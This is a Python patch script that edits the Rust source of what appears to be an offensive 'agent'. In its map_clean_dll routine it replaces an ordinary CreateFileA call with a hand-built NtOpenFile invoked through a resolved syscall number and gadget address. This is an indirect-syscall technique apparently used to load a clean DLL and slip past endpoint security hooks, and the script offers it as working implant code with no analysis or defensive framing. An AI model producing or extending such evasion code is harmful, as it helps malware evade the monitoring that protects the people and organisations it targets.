import sys

content = open('agent/src/syscalls.rs', 'r').read()

old_code = """        let h_file = CreateFileA(
            c_path.as_ptr(),
            GENERIC_READ,
            FILE_SHARE_READ,
            std::ptr::null_mut(),
            OPEN_EXISTING,
            0,
            std::ptr::null_mut(),
        );
        if h_file == winapi::um::handleapi::INVALID_HANDLE_VALUE {
            return Err(anyhow!("Failed to open {} from system directory. Refusing to initialize.", dll_name));
        }"""

new_code = """        let sys_ntopenfile = get_syscall_id("NtOpenFile")?;
        
        use std::os::windows::ffi::OsStrExt;
        let mut nt_path = format!(r"\\??\\{}\\System32\\{}", sysroot, dll_name).encode_utf16().chain(std::iter::once(0)).collect::<Vec<u16>>();
        
        let mut obj_name: winapi::shared::ntdef::UNICODE_STRING = std::mem::zeroed();
        obj_name.Length = ((nt_path.len() - 1) * 2) as u16;
        obj_name.MaximumLength = (nt_path.len() * 2) as u16;
        obj_name.Buffer = nt_path.as_mut_ptr();
        
        let mut obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
        obj_attr.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
        obj_attr.ObjectName = &mut obj_name;
        obj_attr.Attributes = 0x00000040; // OBJ_CASE_INSENSITIVE
        
        let mut io_status: [u64; 2] = [0, 0];
        let mut h_file: winapi::shared::ntdef::HANDLE = std::ptr::null_mut();
        
        let status = do_syscall(sys_ntopenfile.ssn, sys_ntopenfile.gadget_addr, &[
            &mut h_file as *mut _ as u64,
            0x80100000, // SYNCHRONIZE | FILE_READ_DATA (GENERIC_READ)
            &mut obj_attr as *mut _ as u64,
            &mut io_status as *mut _ as u64,
            1, // FILE_SHARE_READ
            0x20, // FILE_SYNCHRONOUS_IO_NONALERT
        ]);
        
        if status != 0 {
            return Err(anyhow!("Failed to open {} with NtOpenFile. Status: {:x}", dll_name, status));
        }"""

if old_code in content:
    content = content.replace(old_code, new_code)
    with open('agent/src/syscalls.rs', 'w') as f:
        f.write(content)
    print("Patched map_clean_dll!")
else:
    print("Could not find old_code!")
